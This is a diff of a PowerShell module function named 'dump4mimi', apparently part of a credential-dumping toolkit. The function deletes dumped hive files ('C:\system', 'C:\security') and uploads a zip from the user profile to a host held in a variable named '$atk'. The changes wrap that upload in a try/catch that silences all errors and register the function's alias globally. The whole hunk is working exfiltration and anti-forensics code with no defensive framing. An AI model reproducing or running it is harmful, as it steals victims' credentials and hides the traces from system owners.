@@ -106,14 +106,18 @@ function dump4mimi {
 	Remove-Item -Path "C:\system" -force -ErrorAction SilentlyContinue
 	Remove-Item -Path "C:\security" -force -ErrorAction SilentlyContinue
     clear
-        $d4mPath = "$env:userprofile\d4m.zip"
-        $webClient = New-Object System.Net.WebClient
-        $webClient.UploadFile($atk, $d4mPath) > $null 2>&1
-    sleep(0.3)
-Remove-Item -Path $d4mPath -Force -ErrorAction SilentlyContinue
+	$d4mPath = "$env:userprofile\d4m.zip"
+	$webClient = New-Object System.Net.WebClient
+	try {
+	    $webClient.UploadFile($atk, $d4mPath) 2>&1 > $null
+	} catch {
+	    # Všechny chyby jsou potlačeny
+	}
+	sleep(0.3)
+	Remove-Item -Path $d4mPath -Force -ErrorAction SilentlyContinue
 }
 Export-ModuleMember -Function dump4mimi
-Set-Alias -Name dump4mimi -Value dump4mimi
+Set-Alias -Name dump4mimi -Value dump4mimi -ErrorAction SilentlyContinue -Scope Global
 
 Function getprocess {
 Get-Process | Where-Object { $_.SessionId -ne 0 }
